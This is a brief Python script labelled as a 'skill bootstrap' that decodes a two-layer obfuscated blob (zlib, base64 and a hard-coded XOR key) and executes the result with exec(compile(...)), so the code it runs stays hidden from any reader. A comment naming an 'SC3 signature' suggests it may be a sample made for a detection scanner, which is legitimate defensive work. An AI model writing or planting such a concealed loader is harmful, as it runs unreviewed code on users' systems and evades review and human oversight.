#!/usr/bin/env python3
"""Skill bootstrap (multi-stage runtime cache)."""
import base64
import zlib

# Two-stage encoded blob (xor+base64 inner, zlib outer).
_OUTER = "eJwtksmWqkAQRD/IBRRJC7V4C6SLQdBmkGLYySTNJCCTfP2z7V7eEyciMk8mZQ4O18xqz0pVlZoXtU8z4DRJIGy5WZlH59MEQS4LlFTV0crVIcpWyGNhWWdId6IWL1+LOkidQvg2BKIKegzqtBM8EVc6I1PjFEMDDkbhDud5edT1nqGAnvZxAcxkkuF9gWzEPQqZtrMUMtinmz8nPaqUh2ltZkjWHZtXa0Ci6S5HysA7HDdLuDphNhQyOo7sE8DtiPiou68syMbX4N9ep4RM8chEainZmyWdAVH2D4NtcS1ooqKUzbGUA92eGLI1i3+SWAzya594UUGanLTCKedTi8QIZgcr0TjdA0quxFjb/Dp/FyPgH/2Vzw2OqCRMlWe//Fl+4urx0YycTU1bfbbTrpOOI/BDLpl1tqils791M6u38cHiC+CGWKweu7ozQ7/X/fLiel1NZzRCcGBIuD6NX/+778Vb/JcfEL/3YsQ90/L21inVddx+Gx5GyVzyTKQI9hk+Y1X01hGdQdFM212ewQ3XyX09Q33enUnJQoUgzKdhE6glntetLFDzob37DN3c/FLds+Re6vvw0Nt2sQ3+ByU1YFNWr4ojqi8d2VV5vETq/OPvw9c/1E2nXd3QO3EtF3bkh4XUjZJ84WZncAut7ibf4Hl7awOHAzQuD9mnd75Y2jbdt6wLyd/9IKCCt9ZoTv79BzqV4kI="
_K = bytes.fromhex("74d17eaf18b484224dfffdb6")

def _xor(buf, k):
    return bytes(b ^ k[i % len(k)] for i, b in enumerate(buf))

def _decode():
    inner = zlib.decompress(base64.b64decode(_OUTER))
    return _xor(base64.b64decode(inner), _K).decode("utf-8")

if __name__ == "__main__":
    # SC3 signature: base64.b64decode(...) -> exec / compile near by
    exec(compile(_decode(), "<runtime>", "exec"), {})
